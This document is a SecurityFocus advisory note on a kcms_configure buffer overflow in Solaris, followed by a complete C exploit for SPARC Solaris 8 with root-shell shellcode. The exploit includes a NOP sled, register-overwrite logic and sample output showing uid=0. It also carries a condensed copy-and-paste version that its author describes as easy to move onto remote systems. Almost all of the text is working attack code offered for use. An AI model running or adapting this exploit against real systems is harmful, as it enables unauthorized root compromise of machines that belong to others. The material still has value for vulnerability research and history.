source: http://www.securityfocus.com/bid/2558/info
 
The Kodak Color Management System, or KCMS, is a package that ships with workstation installations of Solaris 7 and 8. kcms_configure, a part of KCMS, is vulnerable to a buffer overflow if it is passed an overly long string on the command-line by a local user. kcms_configure is installed setuid root, so a buffer overflow can lead to arbitrary code execution as root.
 
An exploit for x86 Solaris is available to attackers. 

/* kcms_configure -o -S command line buffer overflow, SPARC/solaris 8
 *
 * http://www.securityfocus.com/bid/2558
 *
 * Coded June 22, 2002 by Adam Slattery. Phear. The vulnerability
 * was discovered a long time ago (04/2001), but there haven't been
 * any published sparc exploits as far as I know (only x86).
 *
 * Adam Slattery <aslattery@sunriselinux.com>
 *
 * DESCRIPTION:
 *
 * The i386/solaris 8 exploit by eEye (Riley Hassell) was trivial. A
 * sparc version is somewhat more complicated, but not daunting. Because
 * of the location of the overflow in the program, quite a bit of code
 * gets executed before the second return (which is the jump to
 * shellcode in a sparc overflow). Some of this code relies on the
 * registers being set, and we're overwriting the saved registers
 * when we overflow the stack buffer. To remedy this situation we
 * need to overflow the stack very carefully because in the process
 * of overwriting the saved i7 register (return address), we overwrite
 * the l0-07 and i0-i6 [fp] registers. The code that gets executed before
 * the second return makes use of a few of these overwritten registers.
 * So... we overwrite these saved registers with a "good" address that
 * points to a pointer, so pretty much any code using values in the
 * registers won't try to access illegal memory and cause a seg fault.
 * It may sound sketchy, but it works.
 *
 * USAGE:
 *
 * gcc kcms_sparc.c -o kcms_sparc
 * ./kcms_sparc [offset] [ptr addr]
 *
 * $ ./kcms_sparc
 * ret address: 0xffbee4f8 [3036]  ptr address: 0xffbeecf8 buflen: 1085
 * # id
 * uid=0(root) gid=100(users)
 *
 *
 * The default offset (3036) should work. 4800 also works. Read the note
 * by the address calculations to see why (there are 2 buffers). Even
 * though it's a 1024 byte buffer, there aren't too many nops left in
 * the second buffer when everything is set so if you have to search
 * for the offet by hand, use increments of 64.
 * The [ptr addr] is an address in memory that points to a pointer.
 * This is loaded into some of the registers that get used before the
 * program jumps into shell code. If the default (0xffbeecf8) doesn't
 * work you, you probably won't be able to make a guess, so you'll
 * have to whip out gdb. If you don't have r00t (most likely), you'll
 * have to use a copy (non-suid) of kcms_configure and LD_PRELOAD a lib
 * to return 0 for geteuid/getegid (so it wonn't detect it's not uid 0).
 *
 *
 * Thanks: optyx, t12, worms, miah, Sun Microsystems, Kodak...
 *
 * Langrets - thanks for making me cookies after I had surgery, which
 *    was the week before I actually released this. They tasted 31337++.
 *
 *
 * random greetz: xexen, rogers, kanu, cyun, cua0, dap, f3tus, xaiou,
 *		langrets, janebond, applejacks, wisdmckr3, cbo2000
 *
 * stupid people: #legions (esp. digiebola, pr00f, gridmark),
 *		MIT, Stanford, Olin (those bastards all turned me down)
 */

#include <stdio.h>
#include <unistd.h>

/* some .s asm code was used from dopesquad.net */
u_char shellcode[] = /* aslattery@sunriselinux.com */

//setuid(0)
  "\x90\x1b\xc0\x0f" /* xor	%o7,%o7,%o0 */
  "\x82\x10\x20\x17" /* mov	23,%g1 */
  "\x91\xd0\x20\x08" /* ta	8 */

/* For some messed up reason it doesn't seem to work if i
 * use one or the other syscall, but it does if i use both. I
 * don't feel like playing with shellcode anymore right now, and
 * this works, so I don't care.
 */
//setreuid(0,0)
  "\x92\x1a\x40\x09" /* xor	%o1,%o1,%o1 */
  "\x82\x10\x20\xca" /* mov	202, %g1 */
  "\x91\xd0\x20\x08" /* ta	8 */

//exec(/bin/sh)
  "\x21\x0b\xd8\x9a" /* sethi	%hi(0x2f626800), %l0 */
  "\xa0\x14\x21\x6e" /* or	%l0, 0x16e, %l0 ! 0x2f62696e */
  "\x23\x0b\xdc\xda" /* sethi	%hi(0x2f736800), %l1 */
  "\x90\x23\xa0\x10" /* sub	%sp, 16, %o0 */
  "\x92\x23\xa0\x08" /* sub	%sp, 8, %o1 */
  "\x94\x1b\x80\x0e" /* xor	%sp, %sp, %o2 */
  "\xe0\x3b\xbf\xf0" /* std	%l0, [%sp - 16] */
  "\xd0\x23\xbf\xf8" /* st	%o0, [%sp - 8] */
  "\xc0\x23\xbf\xfc" /* st	%g0, [%sp - 4] */
  "\x82\x10\x20\x3b" /* mov	59, %g1 */
  "\x91\xd0\x20\x08" /* ta	8 */
;

u_char NOP[4] = "\xa6\x1c\xc0\x13"; /* xor %l3, %l3, %l3 */


/* we need 1085 bytes to overwrite saved i7 */
/* the vulnerable buffer is a 1024 bytes long */
#define BIGBUF 1086

/* Offsets to saved registers in relation to the bottom of the buffer: */
#define l0_OFFSET 1025
#define i7_OFFSET 1081


/* figure out where the stack starts so we have a rough guestimation */
u_long get_sp(void)
{
   __asm__("mov %sp, %i0\n");
}

int main(int argc, char **argv)
{
   u_char buf[BIGBUF+6];
   int i, offset;
   u_long addr;
   u_long paddr;

   if(argc > 1)
      if(!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))
       {
         printf("%s [retaddr offset] [ptraddr]\n", argv[0]);
         exit(0);
       }

   /* Calculate the return address to put in i7.
    * 3036 should dump us into the nops just fine.
    * We actually have 2 different windows with about 900 bytes
    * of nops each because the buffer we overflow gets copied into
    * another 1024 byte buffer directly below it on the stack.
    * This actually overwrites the first couple hundred nops,
    * but we still have a bunch, so it's ok.
    */
   addr = get_sp();
   if(argc > 1)
      offset = atoi(argv[1]);
   else
      offset = 3036;
   addr -= offset;

   if(argc > 2)
      paddr = strtoul(argv[2], NULL, 0);
   else
      paddr = 0xffbeecf8; //0xffbee3e8 might work too;

   memset(buf, 255, BIGBUF);

   /* Copy NOPS until ~80 bytes before the end of vulnbuf */
   for(i = 1; i < 940 ; i+=4)
      memcpy(buf+i, NOP, 4);

   /* Copy shellcode */
   memcpy(buf+i, shellcode, strlen(shellcode));

   /* because so much code gets executed before the second return, we
    * have to overwrite the stack with very precise data. Finding the
    * right values takes some time in gdb, but it turns out we just need
    * a value that points to some valid memory that points somewhere else.
    * Additionally, this address + 8 needs to do the same. So we need a 
    * string of pointers to pointers. Luckily, this happens quite
    * frequently by blind luck. It just takes some searching in gdb.
    *
    * We just fill all the registers (except i7) with this address. I
    * started with just i1, i4, and i6(fp), and this worked great
    * testing as a normal user, but the program's execution is slightly
    * different when it runs as root (mkdir doesn't fail :), so it was
    * seg faulting and i couldn't figure out why (debugging suid binaries
    * as a normal user is impossible :). So instead of wrapping all these
    * damn library calls through my LD_PRELOADed geteuid() library, I
    * tried filling all the registers. b00m. It worked.
    */

   /* l0-l7 and i0-i6(fp) */
   for(i=l0_OFFSET ; i < i7_OFFSET ; i+=4)
      memcpy(&buf[i], &paddr, 4);

   /* i7, return address */
   memcpy(&buf[i7_OFFSET], &addr, 4);

   /* Null terminate */
   buf[i7_OFFSET+4] = '\0';

   printf("ret address: 0x%x [%d]  ptr address: 0x%x  len: %d\n", \
		addr, offset, paddr, strlen(buf));
   /* b00m! */
   execl("/usr/X/bin/kcms_configure", "pine", "-o", "-S", \
	"blah", buf, NULL);

   puts("execl failed");
return 0;
}



#ifdef UGLY_COPY_AND_PASTE_VERSION
// Fits in a single terminal screen, makes it easier to copy&paste
// the exploit to a remote system. Maybe I'm being a little bit too
// nice to the kiddies? It even has a nice smiley face :)
// ... BEGIN ...

#include <stdio.h>
#include <sys/types.h>
u_char shellcode[] =
"\x90\x1b\xc0\x0f\x82\x10\x20\x17\x91\xd0\x20\x08\x92\x1a\x40\x09"
"\x82\x10\x20\xca\x91\xd0\x20\x08\x21\x0b\xd8\x9a\xa0\x14\x21\x6e"
"\x23\x0b\xdc\xda\x90\x23\xa0\x10\x92\x23\xa0\x08\x94\x1b\x80\x0e"
"\xe0\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b"
"\x91\xd0\x20\x08"; u_char NOP[4]="\xa6\x1c\xc0\x13"; u_long
get_sp(void){__asm__("mov %sp, %i0\n");}int main(int ac,char **av)
{ u_char    buf[1092];int i,    offset; u_long addr; u_long pa;
if(ac>1)    if(!strcmp(av[1],   "-h")||!strcmp(av[1],"--help")) {
printf("%s  [retaddr offset]    [ptraddr]\n", av[0]); exit(0); }
addr=get_sp(); if(   ac>1) offset=atoi(av[1]); else offset=3036;
addr-=offset;if(ac   >2)pa=strtoul(av[2],NULL,0);else pa=0xffbeecf8;
memset(buf    ,255,1086);for   (i=1;i<940;i+=4) memcpy(buf+i,NOP,4);
memcpy(buf+    i,shellcode    ,strlen(shellcode)); for(i=1025;i<1081;
i+=4) memcpy(               &buf[i], &pa, 4); memcpy(&buf[1081],
&addr,4);buf[1085]='\0';printf("ret: 0x%x [%d] ptr: 0x%x len: %d\n",
addr,offset,pa,strlen(buf)); execl("/usr/X/bin/kcms_configure",
"pine","-o","-S","blah",buf,NULL); puts("exec failed"); return 0; }
// ... END ...
#endif
